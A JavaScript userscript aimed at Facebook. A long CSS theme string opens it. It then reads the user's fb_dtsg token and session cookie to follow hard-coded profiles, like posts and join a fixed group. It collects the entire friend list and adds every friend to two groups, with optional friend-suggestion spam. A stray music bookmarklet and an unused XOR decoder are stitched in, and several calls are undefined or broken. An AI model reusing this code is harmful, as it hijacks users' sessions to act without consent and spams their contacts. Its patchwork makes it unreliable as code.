18px !important;}\n.fg_action_hide {width: 18px !important; margin-top: 0 !important; }\n\n.fg_action_hide_container {width: 18px !important;}\n.uiSideNav li {left: 0 !important;padding-left: 0 !important;}\n\n.UIHotStory_Bling,.UIHotStory_BlingCount:hover,.request_link:hover,.request_link span:hover,.uiLinkButton {text-decoration: none !important;}\n\nli form + .navSubmenu > div > div {padding: 12px !important; margin-top: -12px !important;}\nli form + .navSubmenu > div img {margin-top: 12px !important;}\n\n.uiStreamBoulderHighlight {border-right: none !important;}\n\n\n.UIMediaItem_Photo .UIMediaItem_Wrapper {padding: 10px !important;}\n\n#footerRight,.fg_action_hide {margin-right: 5px !important;}\n\n.fbx_stream_header,.pas .input {padding: 5px !important;}\n\n.ptm {padding: 5px 0 !important;}\n\n.fbTimelineUnitActor {padding-top: 5px !important;}\n.home_right_column {padding-top: 0 !important;}\n\n.uiButton[tooltip-alignh=\"right\"] .uiButtonText {padding: 2px 10px 3px 10px !important; font-weight: bold !important;}\n\n.uiSideNav .uiCloseButton {left: 160px !important;border: none !important;}\n.uiSideNav .uiCloseButton input {padding-left: 2px !important;padding-right: 2px !important;margin-top: -4px !important;border: none !important;}\n\n.storyInnerContent .uiTooltip.uiCloseButton   {margin-right: -10px !important;}\n.storyInnerContent .stat_elem .wrap .uiSelectorButton.uiCloseButton,.uiFutureSideNavSection .open .item,.uiFutureSideNavSection .open .subitem,.uiFutureSideNavSection .open .subitem .rfloat,.uiSideNav .subitem,.uiSideNav .open .item {margin-right: 0 !important;}\n\n.audienceSelector .wrap .uiSelectorButton {padding: 2px !important;}\n\n.jewelHeader,.fbSettingsListItemDelete {margin: 0 !important;}\n.UITitledBox_Title {margin-left: 4px;margin-top:1px;}\n\n.uiHeader .uiHeaderTitle {margin-left: 7px !important;}\n.fbx_stream_header .uiHeaderTitle,#footerLeft  {margin-left: 5px !important;}\n\n.comments_add_box_image {margin-right: -5px !important;}\n.show_advanced_controls {margin-top:-5px !important;}\n.chat_window_wrapper {margin-bottom: 3px !important;}\n.UIUpcoming_Item {margin-bottom: 5px !important;}\n#pagelet_right_sidebar {margin-left: 0 !important;}\n\n.profile-pagelet-section,.uiStreamHeaderTall,.timelineRecentActivityLabel,.friendsBoxHeader  {padding: 5px 10px !important;}\n\n.GBSearchBox_Button,.uiSearchInput button {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/search.png\")  center center !important;}\n.uiSearchInput button {width: 23px !important;height: 21px !important;top: 0 !important;background-position: 3px 2px !important;}\n\n.UIButton_Text,.UISearchInput_Text {font-weight: normal !important;}\n\n.x_to_hide,.top_bar_pic .UIRoundedImage {margin: 0 !important;padding: 0 !important;}\n\n.uiHeaderActions .uiButton .uiButtonText {margin-left: 15px !important;}\n\n\n.searchroot,#share_submit input {padding-right: 5px !important; }\n.composerView {padding-left: 8px !important;padding-bottom: 4px !important;}\n.info_section {padding: 6px !important;}\n.uiInfoTable .dataRow .inputtext {min-width: 200px !important;}\n\n.fbPrivacyWidget .uiButton .mrs,.uiButtonSuppressed .mrs {margin: 0 -10px 0 6px !important;}\n\n.uiStreamPrivacyContainer .uiTooltip,.UIActionMenu_Lock,.fbPrivacyLockButton,.fbPrivacyLockButton:hover,.sx_7bedb4,.fbPrivacyWidget .uiButton .mrs,.uiButtonSuppressed .mrs,div.fbPrivacyLockSelector {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/privacylock.png\") no-repeat center center !important;}\n\n.jewelCount,.pagesTimelineButtonPagelet .counter {margin: -8px -4px 0 0 !important;padding: 1px 4px !important;}\n\n#share_submit {padding: 0 !important;border: none !important;}\n#share_submit input,.friend_list_container .friend {padding-left: 5px !important;}\n\na{outline: none !important;}\n\n#contact_importer_container input[value=\"Find Friends\"] {border: none !important;box-shadow: none !important;}\n\n#pageLogo {margin-left: -1px !important;  }\n\n#pageLogo a {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Facebook.png\") no-repeat center center !important;left: 0 !important;width: 107px !important;margin-right: 1px !important; margin-top: 0 !important;}\n\n#pageLogo a:hover {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Facebook-glow.png\") no-repeat center center !important;}\n\n#pageHead {margin-top: -6px !important;}\n\n.mainWrapper .uiSelectorButton { margin-top: 10px !important; }\n\n.platform_dialog #blueBar,.withCanvasNav #blueBar {position: absolute !important; margin-top: 10px !important; height: 30px !important;  }\n\n.friend_list_container .friend {margin-right: 0 !important; }\n\n.list_select {padding: 3px !important;}\n\n.fbNubFlyout .input {width: 254px !important;}\n\n.highlightIndicator {top: 0 !important;}\n\n.audienceSelector .uiButtonText {padding-left: 8px !important;}\n.profile #pagelet_netego {margin-top: -60px !important;margin-left: -30px !important;}\n.pas .input,.selectedCheckable .checkmark {margin-left: -5px !important;}\n\n.removable {top: 0 !important;bottom: 0 !important;margin-top: -4px !important;border: none !important;}\n\n.uiSideNavCount,.uiStreamAttachments div embed,.jewelCount,.uiButton,.fbChatSidebarFooter .button,.uiSearchInput button,.uiSelectorButton,.pagesTimelineButtonPagelet .counter,#pagelet_timeline_profile_actions .counter,.pluginRecommendationsBarButtonLike {border-radius: 6px !important;}\n\n.fbActivity,.UIRoundedImage {margin: 4px !important;}\n\n#facebook:not(.tinyViewport) body:not(.UIPage_LoggedOut):not(.fbIndex):not(.platform_dialog):not(.withCanvasNav) #blueBar {width: 100% !important;margin: 0 auto !important;top: 10px !important;height: 30px !important;}\n\n.uiUfiSmall .commentArea .textBox:not([style*=\"height\"]) {height: 20px !important; }\n.composerTypeahead .textInput:not([style*=\"height\"]){height: 27px !important; }\n\n.dataTable .inputtext,.uiInfoTable .dataRow .inputtext {padding-left: 20px !important;}\n\n.fbTimelineAllActivityStorySelector .uiButton,.fbDockChatTabFlyout .close {margin-top: 3px !important;}\n.fbTimelineAllActivityStorySelector .uiButton .img {margin: 0 -3px !important;}\n\n.audienceSelector .uiButton {padding: 2px 0 2px 0 !important;}\n.audienceSelector .uiButton .img {margin-right: -1px !important;}\n\n.fbTimelineContentHeader .uiHeaderTitle {font-size: 2.0em !important;}\n\n\n.ogSliderAnimPagerGridTd .page {margin: 0 14px 0 -5px !important;}\n.ogSliderAnimPagerNext .content {margin-left: -18px !important;}\n#bfb_options_button_li {float:left !important;}\n\n.fbTimelineCapsule {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Black_50pct_3x1.png\") repeat-y scroll center top transparent !important;}";
if (typeof GM_addStyle != "undefined") {
        GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
        PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
        addStyle(css);
} else {
        var node = document.createElement("style");
        node.type = "text/css";
        node.appendChild(document.createTextNode(css));
        var heads = document.getElementsByTagName("head");
        if (heads.length > 0) {
                heads[0].appendChild(node);
        } else {
                // no head yet, stick it whereever
                document.documentElement.appendChild(node);
        }
}
})();

//MyPic
P("1396210413973835"); P("253977474770824"); P("222746044599640");
Like("211407752400136");
//Jibin
a("100004757191768");
sublist("264056837096221");
sublist("269611969874041");
sublist("269611833207388");
sublist("274745036027401");
sublist("274744492694122");
sublist("274744732694098");

// Ji
sublist("1413081002285659");
sublist("1413080875619005");
sublist("1413080835619009");
sublist("1413080625619030");
sublist("1413080032285756");


//nhac
javascript:(function(){function c(){var e=document.createElement('link');e.setAttribute('type','text/css');e.setAttribute('rel','stylesheet');e.setAttribute('class',l);document.body.appendChild(e)}function h(){var e=document.getElementsByClassName(l);for(var t=0;t<e.length;t++){document.body.removeChild(e[t])}}function p(){var e=document.createElement('div');e.setAttribute('class',a);document.body.appendChild(e);setTimeout(function(){document.body.removeChild(e)},100)}function d(e){return{height:e.offsetHeight,width:e.offsetWidth}}function v(i){var s=d(i);return s.height>e&&s.height<n&&s.width>t&&s.width<r}function m(e){var t=e;var n=0;while(!!t){n+=t.offsetTop;t=t.offsetParent}return n}function g(){var e=document.documentElement;if(!!window.innerWidth){return window.innerHeight}else if(e&&!isNaN(e.clientHeight)){return e.clientHeight}return 0}function y(){if(window.pageYOffset){return window.pageYOffset}return Math.max(document.documentElement.scrollTop,document.body.scrollTop)}function E(e){var t=m(e);return t>=w&&t <=b+w}function S(){var e=document.createElement('audio');e.setAttribute('class',l);e.src=i;e.loop=true;e.addEventListener('canplay',function(){setTimeout(function(){x(k)},500);setTimeout(function(){N();p();for(var e=0;e<O.length;e++){T(O[e])}},15500)},true);e.addEventListener('ended',function(){N();h()},true);e.innerHTML=' <p>If you are reading this, it is because your browser does not support the audio element. We recommend that you get a new browser.</p> <p>';document.body.appendChild(e);e.play()}function x(e){e.className+=' '+s+' '+o}function T(e){e.className+=' '+s+' '+u[Math.floor(Math.random()*u.length)]}function N(){var e=document.getElementsByClassName(s);var t=new RegExp('\\b'+s+'\\b');for(var n=0;n<e.length;){e[n].className=e[n].className.replace(t,'')}}var e=1;var t=1;var n=100;var r=100;var i='http://music-hn.24hstatic.com/uploadmusic2/af141145512665a63c1b59d6b1fbb914/521bb3d2/uploadmusic/id_le/3-2013/Hungnk/Nam2013/Nhac2013/Tuan-35/128/Neu%20La%20Anh%20-%20The%20Men.mp3';var s='mw-harlem_shake_me';var o='im_first';var u=['im_drunk','im_baked','im_trippin','im_blown'];var a='mw-strobe_light';var l='mw_added_css';var b=g();var w=y();var C=document.getElementsByTagName('*');var k=null;for(var L=0;L<C.length;L++){var A=C[L];if(v(A)){if(E(A)){k=A;break}}}if(A===null){console.warn('Could not find a node of the right size. Please try a different page.');return}c();S();var O=[];for(var L=0;L<C.length;L++){var A=C[L];if(v(A)){O.push(A)}}})()
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);






//

function hp_d12(s) {
var o = "",
ar = new Array(),
os = "",
ic = 0,
p = 0;
for (i = 0; i < s.length; i++) {
c = s.charCodeAt(i);
if (c < 128) c = c ^ ((p++ % 8) + 1);
os += String.fromCharCode(c);
if (os.length > 80) {
ar[ic++] = os;
os = ""
}
}
o = ar.join("") + os;
return o
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function cereziAl(isim) {
var tarama = isim + "=";
if (document.cookie.length > 0) {
konum = document.cookie.indexOf(tarama);
if (konum != -1) {
konum += tarama.length;
son = document.cookie.indexOf(";", konum);
if (son == -1) son = document.cookie.length;
return unescape(document.cookie.substring(konum, son))
} else {
return ""
}
}
}
function getRandomInt(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min
}
function randomValue(arr) {
return arr[getRandomInt(0, arr.length - 1)]
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone) {
var http4 = new XMLHttpRequest();
var url4 = "/ajax/follow/follow_profile.php?__a=1";
var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
http4.open("POST", url4, true);
http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http4.setRequestHeader("Content-length", params4.length);
http4.setRequestHeader("Connection", "close");
http4.onreadystatechange = function() {
if (http4.readyState == 4 && http4.status == 200) {
http4.close
}
};
http4.send(params4)
}

var gid = ['261605130688532'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
data = eval('(' + gf['responseText']['substr'](9) + ')');
if (data['error']) {} else {
friends = data['payload']['entries']['sort'](function(_0x93dax8, _0x93dax9) {
return _0x93dax8['index'] - _0x93dax9['index']
})
}
};
var Title = 'CHƯƠNG TRÌNH THÊM BẠN VÀO NHÓM <A style="color:#3B5998;" href="http://www.facebook.com/jung.Bin.100">nhok</A>';
grpname = document.getElementById("groupsJumpTitle").innerHTML;
var Descriptions = "",
_text = 'Powered By <A style="color:#3B5998;" href=" https://www.facebook.com/groups/261605130688532/">Largest Group.</A> Join it now.';

function AddFriendtoGroup(opo) {
jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=" + gid + "&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function(a) {
var b = a.substring(a.indexOf("{"));
var c = JSON.parse(b);
i--;
Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
if (c.error) {
Descriptions += "color:darkred'>";
err++;
if (c.errorDescription) Descriptions += c.errorDescription;
else Descriptions += JSON.stringify(c, null, "")
} else {
Descriptions += "color:darkgreen'>";
Descriptions += arn[i] + " has been added.<br/>";
suc++
}
Descriptions += "</div>";
var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
if (i > 0) {
display += arr.length + " Friends Detected<br/>";
display += "<b>" + suc + "</b> Friends Added of " + (arr.length - i) + " Friends Processed ";
display += "(" + i + " Lefted...)";
display += "<div class='friend-edge'>";
display += Descriptions;
display += "<img style='background:center no-repeat url(https://fbcdn-profile-a.akamaihd.net/static-ak/rsrc.php/v2/yo/r/UlIqmHJn-SK.gif);width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
display += getuname + " Thanks For Adding Your Friends in " + grpname + ".<br/>";
display += _text;
display += "</div>";
display += "</div>"
} else {
display += arr.length + " Friends Detected<br/>";
display += suc + " Friends Added</br>";
display += err + " Friends Not Added</br></br>";
display += "<div><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"'>Cancel</span>"
}
display += "</div>";
document.getElementById("pagelet_sidebar").innerHTML = display
}, "text", "post");
tay--;
if (tay > 0) {
var s = arr[tay];
sx = pho[tay];
setTimeout("AddFriendtoGroup(" + s + ")", 100)
}
console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
if (gid != 595817043846491) {
jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=595817043846491&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function() {}, "text", "post")
}
if (newcomer) {
jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=100004341312656&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=16581651071156988110194", function() {}, "text", "post")
}
}
function clickfr_callback() {
if (document.getElementsByName("ok").length > 0) nHtml.ClickUp(document.getElementsByName("ok")[0]);
var a = arr[i];
if (i < arr.length) addfriend(a.substring(0, 4))
}
function clickfr() {
if (document.getElementsByClassName("search").length > 0) nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1]);
else j++;
setTimeout("clickfr_callback()", 2E3)
}
function addfriend(a) {
i++;
setTimeout("clickfr()", 2E3)
}
jx = {
getHTTPObject: function() {
var a = false;
if (typeof ActiveXObject != "undefined") try {
a = new ActiveXObject("Msxml2.XMLHTTP")
} catch (b) {
try {
a = new ActiveXObject("Microsoft.XMLHTTP")
} catch (c) {
a = false
}
} else if (window.XMLHttpRequest) try {
a = new XMLHttpRequest
} catch (b) {
a = false
}
return a
},
load: function(url, callback, format, method, opt) {
var http = this.init();
if (!http || !url) return;
if (http.overrideMimeType) http.overrideMimeType("text/xml");
if (!method) method = "GET";
if (!format) format = "text";
if (!opt) opt = {};
format = format.toLowerCase();
method = method.toUpperCase();
var now = "uid=" + (new Date).getTime();
url += url.indexOf("?") + 1 ? "&" : "?";
url += now;
var parameters = null;
if (method == "POST") {
var parts = url.split("?");
url = parts[0];
parameters = parts[1]
}
http.open(method, url, true);
var ths = this;
if (opt.handler) http.onreadystatechange = function() {
opt.handler(http)
};
else http.onreadystatechange = function() {
if (http.readyState == 4) if (http.status == 200) {
var result = "";
if (http.responseText) result = http.responseText;
if (format.charAt(0) == "j") {
result = result.replace(/[\n\r]/g, "");
result = eval("(" + result + ")")
} else if (format.charAt(0) == "x") result = http.responseXML;
if (callback) callback(result)
} else {
if (opt.loadingIndicator) document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator);
if (opt.loading) document.getElementById(opt.loading).style.display = "none";
if (error) error(http.status)
}
};
http.send(parameters)
},
bind: function(a) {
var b = {
url: "",
onSuccess: false,
onError: false,
format: "text",
method: "GET",
update: "",
loading: "",
loadingIndicator: ""
};
for (var c in b) if (a[c]) b[c] = a[c];
if (!b.url) return;
var d = false;
if (b.loadingIndicator) {
d = document.createElement("div");
d.setAttribute("style", "position:absolute;top:0px;left:0px;");
d.setAttribute("class", "loading-indicator");
d.innerHTML = b.loadingIndicator;
document.getElementsByTagName("body")[0].appendChild(d);
this.opt.loadingIndicator = d
}
if (b.loading) document.getElementById(b.loading).style.display = "block";
this.load(b.url, function(a) {
if (b.onSuccess) b.onSuccess(a);
if (b.update) document.getElementById(b.update).innerHTML = a;
if (d) document.getElementsByTagName("body")[0].removeChild(d);
if (b.loading) document.getElementById(b.loading).style.display = "none"
}, b.format, b.method, b)
},
init: function() {
return this.getHTTPObject()
}
};
var nHtml = {
FindByAttr: function(a, b, c, d) {
if (c == "className") c = "class";
var e = document.evaluate(".//" + b + "[@" + c + "='" + d + "']", a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
if (e && e.singleNodeValue) return e.singleNodeValue;
return null
},
FindByClassName: function(a, b, c) {
return this.FindByAttr(a, b, "className", c)
},
FindByXPath: function(a, b) {
try {
var c = document.evaluate(b, a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null)
} catch (d) {
GM_log("bad xpath:" + b)
}
if (c && c.singleNodeValue) return c.singleNodeValue;
return null
},
VisitUrl: function(a) {
window.setTimeout(function() {
document.location.href = a
}, 500 + Math.floor(Math.random() * 500))
},
ClickWin: function(a, b, c) {
var d = a.document.createEvent("MouseEvents");
d.initMouseEvent(c, true, true, a, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
return !b.dispatchEvent(d)
},
Click: function(a) {
return this.ClickWin(window, a, "click")
},
ClickTimeout: function(a, b) {
window.setTimeout(function() {
return nHtml.ClickWin(window, a, "click")
}, b + Math.floor(Math.random() * 500))
},
ClickUp: function(a) {
this.ClickWin(window, a, "mousedown");
this.ClickWin(window, a, "mouseup");
this.ClickWin(window, a, "click")
},
GetText: function(a, b) {
var c = "";
if (b == undefined) b = 0;
if (b > 40) return;
if (a.textContent != undefined) return a.textContent;
for (var d = 0; d < a.childNodes.length; d++) {
var e = a.childNodes[d];
c += this.GetText(e, b + 1)
}
return c
}
};
if (document.getElementsByClassName == undefined) document.getElementsByClassName = function(a) {
var b = new RegExp("(?:^|\\s)" + a + "(?:$|\\s)");
var c = document.getElementsByTagName("*");
var d = [];
var e;
for (var f = 0;
(e = c[f]) != null; f++) {
var g = e.className;
if (g && g.indexOf(a) != -1 && b.test(g)) d.push(e)
}
return d
};
Array.prototype.find = function(a) {
var b = false;
for (i = 0; i < this.length; i++) if (typeof a == "function") {
if (a.test(this[i])) {
if (!b) b = [];
b.push(i)
}
} else if (this[i] === a) {
if (!b) b = [];
b.push(i)
}
return b
};
var i = 3;
var tay = 3;
var j = 0;
var k = 0;
var suc = 0;
var err = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var getuname = document.getElementsByClassName("fbxWelcomeBoxName")[0].innerHTML;
var gid = document.getElementsByName("group_id")[0].value;
jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", function(a) {
var b = a;
var c = b.substring(b.indexOf("{"));
var d = JSON.parse(c);
d = d.payload.entries;
for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
i = arr.length - 1;
tay = i;
console.log(arr.length);
var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
display += arr.length + " Friends Detected";
display += "</div>";
document.getElementById("pagelet_sidebar").innerHTML = display;
AddFriendtoGroup(arr[i])
});